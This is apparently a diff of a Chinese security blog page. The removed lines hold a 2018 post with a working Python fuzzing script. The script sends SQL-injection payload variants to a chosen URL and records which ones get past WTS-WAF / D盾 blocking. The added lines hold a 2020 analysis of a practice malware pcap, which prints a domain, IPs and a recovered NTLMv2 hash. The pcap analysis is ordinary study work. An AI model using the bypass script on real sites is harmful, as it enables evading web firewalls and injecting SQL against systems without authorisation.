@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>简单bypass过狗脚本 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="简单bypass过狗脚本 | 九世的博客">
+  <title>malware-traffic恶意流量包分析笔记 | 九世的博客</title>
+  <meta name="keywords" content=" 恶意分析 ">
+  <meta name="description" content="malware-traffic恶意流量包分析笔记 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1535,9 +1535,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-简单bypass过狗脚本" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-malware-traffic恶意流量包分析笔记" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">简单bypass过狗脚本</h1>
+        <h1 class="article-title">malware-traffic恶意流量包分析笔记</h1>
     
     <div class="article-meta">
         
@@ -1546,14 +1546,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">恶意分析</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-09-30 21:50</time>
+        创建时间:<time class="date" title="更新时间: 2020-12-15 01:53:40">2020-12-15 00:29</time>
         
     </div>
     <div class="article-meta">
@@ -1575,7 +1575,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#起因"><span class="toc-text">起因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析过程"><span class="toc-text">分析过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1590,48 +1590,61 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>国庆回到家，当然要搞事对不对。搞事就要嗨皮，嗨皮就是要战歌，总之很皮就对了<br>（稽不可言）<br><img src="https://s1.ax1x.com/2018/09/30/i1Zt2t.png" alt="i1Zt2t.png"></p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>我这里写的是一个针对WTS-WAF的，这个脚本是思路也很简单</p>
-<pre><code>1.创建几个fuzz的列表然后加在一起
-2.遍历多几次和生成字典一样
-3.发送请求判断是否有关键词存在
-4.没有则成功过了
-</code></pre><p>代码：</p>
-<pre><code>import requests
-import time
+        <h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>(中间停更过一段时间博客，因为懒都发星球去了。现在打算继续写)<br>翻到之前收藏的恶意流量分析练习的pcap地址，下载一个来弄弄<br><a href="https://www.malware-traffic-analysis.net/" target="_blank" rel="noopener">https://www.malware-traffic-analysis.net/</a><br>解压密码:infected<br><img src="https://s3.ax1x.com/2020/12/15/ru7id0.png" alt=""></p>
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>wireshark打开后，我比较喜欢先统计一下所有的IP，和包里有什么协议，还有注意一下导出分组里的内容。<br>导出对象<br><img src="https://s3.ax1x.com/2020/12/15/ru7mQJ.png" alt=""><br>IP统计<br><img src="https://s3.ax1x.com/2020/12/15/ru7wwt.png" alt=""><br>协议分级<br><img src="https://s3.ax1x.com/2020/12/15/ru7ny9.png" alt=""></p>
+<p>从上图可以得到以下几点信息：</p>
+<ul>
+<li>存在HTTP、SMB、LDAP、DNS流量</li>
+<li>SMB和LDAP流量占多</li>
+<li>源IP访问的目标IP端口</li>
+</ul>
+<p>看了一下HTTP流量，发现是下载了三个文件<br><img src="https://s3.ax1x.com/2020/12/15/ruHA0I.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2020/12/15/ruHZAP.png" alt=""></p>
+<p>尝试过提取出来，发现并不行。失败了，将pcap上传到<img src="https://pcap.zhouhe.360.cn/" alt="宙合列表">发现VT上有样本<br><img src="https://s3.ax1x.com/2020/12/15/ruL2CV.png" alt=""></p>
+<p>三个都免杀，但是看了一下VT的检测结果。发现没有任何外连(不排除判断是否在虚拟机里运行，是的话直接ExitProcess)<br>查询结果：<a href="https://pcap.zhouhe.360.cn/saas/results/?uid=481b567aaed8f4edc751d2ae7077cabf&amp;name=rawLog" target="_blank" rel="noopener">https://pcap.zhouhe.360.cn/saas/results/?uid=481b567aaed8f4edc751d2ae7077cabf&amp;name=rawLog</a><br><img src="https://s3.ax1x.com/2020/12/15/ruLfvF.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2020/12/15/ruL4u4.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2020/12/15/ruL5DJ.png" alt=""></p>
+<p>HTTP流量到这里貌似也没啥好追的了，看了一眼TLS也没啥异样<br><img src="https://s3.ax1x.com/2020/12/15/ruLH4x.png" alt=""></p>
+<p>然后把目光转向smb，发现存在个域。使用Kerberos TGT访问的域控<br><img src="https://s3.ax1x.com/2020/12/15/ruLXvD.png" alt=""><br><img src="https://s3.ax1x.com/2020/12/15/ruLOgO.png" alt=""></p>
+<p>看了一下成功认证smb后访问过的文件和文件夹，也没有干啥<br><img src="https://s3.ax1x.com/2020/12/15/ruOpVA.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2020/12/15/ruOC5t.png" alt=""></p>
+<p>后面用NTLMRawUnHide从数据包里提取出了一个NTLM<br><img src="https://s3.ax1x.com/2020/12/15/ruOF8f.png" alt=""></p>
+<p>至此信息如下：</p>
+<pre><code>HTTP
+------------
+domain:
+t497sword.com - 5.44.3.72 4- 俄罗斯莫斯科
+download.windowsupdate.com - 72.21.81.240 - 美国
+ctldl.windowsupdate.com -67.24.185.254 - 美国
 
-start=time.time()
-xj=open(&#39;save.txt&#39;,&#39;w&#39;)
-xj.close()
-def by_pass():
-    filter_a=&#39;D盾_拦截提示&#39;
-    filter_b=&#39;浏览器安全检查中.....请稍后&#39;
-    user=input(&#39;url:&#39;)
-    url=&#39;{}%20&#39;.format(user.strip())
-    headers={&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#39;}
-    Fuzz_a = [&#39;/*!&#39;, &#39;*/&#39;, &#39;/**/&#39;, &#39;/&#39;, &#39;?&#39;, &#39;~&#39;, &#39;!&#39;, &#39;.&#39;, &#39;%&#39;, &#39;-&#39;, &#39;*&#39;, &#39;+&#39;, &#39;=&#39;]
-    Fuzz_b = [&#39;&#39;]
-    Fuzz_c = [&#39;%0a&#39;, &#39;%0b&#39;, &#39;%0c&#39;, &#39;%0d&#39;, &#39;%0e&#39;, &#39;%0f&#39;, &#39;%0h&#39;, &#39;%0i&#39;, &#39;%0j&#39;]
-    fuzz=Fuzz_a+Fuzz_b+Fuzz_c
-    for a in fuzz:
-        for b in fuzz:
-            for c in fuzz:
-                payload=&#39;/*!and&#39;+a+b+c+&#39;1=2/*&#39;
-                urls=url.strip()+payload.strip()
-                try:
-                    reqt=requests.get(url=urls,headers=headers)
-                    if filter_a in reqt.content.decode(&#39;utf-8&#39;) and filter_b in reqt.content.decode(&#39;utf-8&#39;):
-                        print(&#39;[-] Over dog failure:{}&#39;.format(reqt.url))
-                    elif not filter_a in reqt.content.decode(&#39;utf-8&#39;) and not filter_b in reqt.content.decode(&#39;utf-8&#39;):
-                        print(&quot;[*] Pass the dog&#39;s success:{}&quot;.format(reqt.url))
-                        print(&quot;[*] Pass the dog&#39;s success:{}&quot;.format(reqt.url),file=open(&#39;save.txt&#39;,&#39;a&#39;))
-                except Exception as error:
-                    print(&#39;[-] Error: {}&#39;.format(error))
-by_pass()
-stop=time.time()
-print(&#39;[!]time:{}&#39;.format(start-stop))
-</code></pre><p>测试结果对比：<br><img src="https://s1.ax1x.com/2018/09/30/i1ZaKf.png" alt="i1ZaKf.png"><br>fuzz脚本：<br><img src="https://s1.ax1x.com/2018/09/30/i1Zdr8.md.png" alt="i1Zdr8.md.png"></p>
-<p>转载请声明：转自422926799.github.io</p>
+SMB
+-------------
+\\MRNATURAL.INFO\IPC$
+\\MrNatural-DC.mrnatural.info\IPC$
+
+
+info
+--------------
+10.12.1.101 hostname:Lenovo_2b Mac:10:c5:95:2b:13:05
+10.12.1.2 hostname:Dell_99 Mac:00:11:43:99:de:87
+[1;37mFound NTLMSSP Message Type 3 :[1;32m Authentication[0;37m
+    [1;34m&gt;[1;37m Domain                 :[0;97m MRNATURAL [0;37m
+    [1;34m&gt;[1;37m Username               :[0;97m fabulous.dale [0;37m
+    [1;34m&gt;[1;37m Workstation            :[0;97m DESKTOP-NATURAL [0;37m
+
+[1;37mNTLMv2 Hash recovered:[0;97m
+MRNATURAL\fabulous.dale::DESKTOP-NATURAL:100dd7adfc69d6a4:2a6c2ec69501afb83ce01d54e115314f:0101000000000000d0521c723bc8d601e8b8829daacf831700000000020012004d0052004e00410054005500520041004c00010018004d0052004e00410054005500520041004c002d004400430004001c006d0072006e00610074007500720061006c002e0069006e0066006f00030036004d0072004e00610074007500720061006c002d00440043002e006d0072006e00610074007500720061006c002e0069006e0066006f0005001c006d0072006e00610074007500720061006c002e0069006e0066006f0007000800d0521c723bc8d60106000400020000000800300030000000000000000000000000200000764598ededc17516e4c2b0bf2070ee5ff48e1dbf474b9cf30823f0967cb02e2e0a001000000000000000000000000000000000000900260063006900660073002f004d0052004e00410054005500520041004c002e0049004e0046004f000000000000000000
+</code></pre><p>后面追踪主机名，看到LDAP查询的内容</p>
+<pre><code>&quot;DC=mrnatural,DC=info&quot;
+&quot;CN=DESKTOP-NATURAL,CN=Computers,DC=mrnatural,DC=info&quot;
+&quot;CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=mrnatural,DC=info&quot;
+&quot;cn=policies,cn=system,DC=mrnatural,DC=info&quot;
+&quot;CN=DESKTOP-NATURAL,CN=Computers,DC=mrnatural,DC=info&quot;
+</code></pre><p><img src="https://s3.ax1x.com/2020/12/15/ruOZrQ.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2020/12/15/ruOebj.png" alt=""></p>
+<p>后面对着每个IP都检查了一下，发现可疑也就http流量的那三个。其他都无异样，后面去微步社区查了一下找到了以下信息<br><img src="https://s3.ax1x.com/2020/12/15/ruOQP0.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2020/12/15/ruO12T.png" alt=""><br><img src="https://s3.ax1x.com/2020/12/15/ruOlGV.png" alt=""></p>
+<p>至此也没什么好弄的，，，可能还有一些别的没发现吧。太菜了<br>以下微步社区和分析的链接：<br><a href="https://x.threatbook.cn/nodev4/ip/72.21.81.240" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/ip/72.21.81.240</a><br><a href="https://x.threatbook.cn/nodev4/ip/67.24.185.254" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/ip/67.24.185.254</a><br><a href="https://blog.talosintelligence.com/2020/07/threat-roundup-0710-0717.html" target="_blank" rel="noopener">https://blog.talosintelligence.com/2020/07/threat-roundup-0710-0717.html</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1641,12 +1654,12 @@ print(&#39;[!]time:{}&#39;.format(start-stop))
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>简单bypass过狗脚本</p>
+    <p><span class="copy-title">文章标题:</span>malware-traffic恶意流量包分析笔记</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-09-30, 21:50:31</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/77e68261.html" title="简单bypass过狗脚本">http://422926799.github.io/posts/77e68261.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-12-15, 00:29:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-12-15, 01:53:40</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/daac1c3c.html" title="malware-traffic恶意流量包分析笔记">http://422926799.github.io/posts/daac1c3c.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
